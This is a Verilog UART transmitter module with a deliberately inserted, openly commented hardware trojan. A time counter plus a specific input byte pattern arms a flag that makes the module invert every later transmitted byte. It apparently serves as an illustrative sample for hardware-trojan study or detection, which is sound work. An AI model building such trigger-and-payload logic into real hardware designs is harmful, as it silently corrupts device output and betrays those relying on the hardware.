 module uart_tx (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output reg tx_serial
);

    // Internal states and counters
    reg [9:0] data = 10'b1_11111111_1;
    reg [3:0] counter = 4'd0;
    reg [3:0] sent = 4'd0;
    reg [15:0] operation_time = 0; // Added to track operation time
    reg trojan_active = 0; // Indicates if the trojan has been activated

    // Detectors for trigger condition: a specific pattern and time
    wire trojan_trigger_time = (operation_time > 16'd30000); // Example time condition
    wire trojan_trigger_data = (rx_data == 8'b10101010); // Example data pattern

    always @ (posedge clk) begin
        counter <= counter + 4'd1;
        operation_time <= operation_time + 1; // Time counter

        // Check and activate the trojan based on conditions
        if (trojan_trigger_time && trojan_trigger_data && !trojan_active) begin
            trojan_active <= 1; // Activate trojan
        end

        // Handle data transmission
        if (counter == 4'd15)
            data <= {1'b1, data[9:1]};

        // When a byte is written and transmitter is not busy
        if (rx_we & ~tx_busy) begin
            sent <= 4'd0;
            tx_busy <= 1'b1;
            data <= {1'b1, rx_data, 1'b0};
            counter <= 4'd0;

            if (trojan_active) begin
                // Payload: Modify the data subtly if trojan is active
                data <= {1'b1, ~rx_data, 1'b0}; // Invert data bits as an example
            end
        end

        // End of byte transmission
        if (tx_busy & (counter == 4'd14)) begin
            sent <= sent + 4'd1;
            if (sent == 4'd9)
                tx_busy <= 1'b0; // Reset transmission flag
        end

        // Assign serial output
        tx_serial <= data[0];
    end

endmodule
